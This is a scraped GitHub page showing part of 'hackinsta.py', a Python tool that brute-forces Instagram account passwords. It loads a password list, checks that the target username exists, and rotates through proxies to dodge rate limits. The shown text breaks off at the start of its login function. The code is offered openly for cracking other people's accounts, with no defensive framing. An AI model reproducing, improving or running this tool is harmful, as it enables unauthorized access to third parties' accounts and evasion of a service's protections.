Skip to content

 fuck3erboy / instahack

Learn Git and GitHub without any code!

Using the Hello World guide, you’ll start a branch, write comments, and open a pull request.
Read the guide

Code Pull requests 10 Projects 0 Wiki Security Pulse

Branch: master 

Find fileCopy path

instahack/hackinsta.py / Jump to 

￼ avramit Update hackinsta.pye22678a on 8 Sep 2017

1 contributor

168 lines (136 sloc)  4.86 KB

RawBlameHistory

 

You're using code navigation to jump to definitions or references.

Learn more or give us feedback

'''TODO LIST:	Fix and make proxy function better	Sort code again	Add help function to all "Yes/no" questions	Add help function to "Press enter to exit input"'''import requestsimport jsonimport timeimport osimport randomimport sys #Help functiondef Input(text):	value = ''	if sys.version_info.major > 2:		value = input(text)	else:		value = raw_input(text)	return str(value) #The main classclass Instabrute():	def __init__(self, username, passwordsFile='pass.txt'):		self.username = username		self.CurrentProxy = ''		self.UsedProxys = []		self.passwordsFile = passwordsFile				#Check if passwords file exists		self.loadPasswords()		#Check if username exists		self.IsUserExists() 		UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()		if (UsePorxy == 'Y' or UsePorxy == 'YES'):			self.randomProxy() 	#Check if password file exists and check if he contain passwords	def loadPasswords(self):		if os.path.isfile(self.passwordsFile):			with open(self.passwordsFile) as f:				self.passwords = f.read().splitlines()				passwordsNumber = len(self.passwords)				if (passwordsNumber > 0):					print ('[*] %s Passwords loads successfully' % passwordsNumber)				else:					print('Password file are empty, Please add passwords to it.')					Input('[*] Press enter to exit')					exit()		else:			print ('Please create passwords file named "%s"' % self.passwordsFile)			Input('[*] Press enter to exit')			exit() 	#Choose random proxy from proxys file	def randomProxy(self):		plist = open('proxy.txt').read().splitlines()		proxy = random.choice(plist) 		if not proxy in self.UsedProxys:			self.CurrentProxy = proxy			self.UsedProxys.append(proxy)		try:			print('')			print('[*] Check new ip...')			print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)		except Exception as e:			print ('[*] Can\'t reach proxy "%s"' % proxy)		print('') 	#Check if username exists in instagram server	def IsUserExists(self):		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 		if (r.status_code == 404):			print ('[*] User named "%s" not found' % username)			Input('[*] Press enter to exit')			exit()		elif (r.status_code == 200):			return True 	#Try to login with password	def Login(self, password):		sess = requests.Session() 

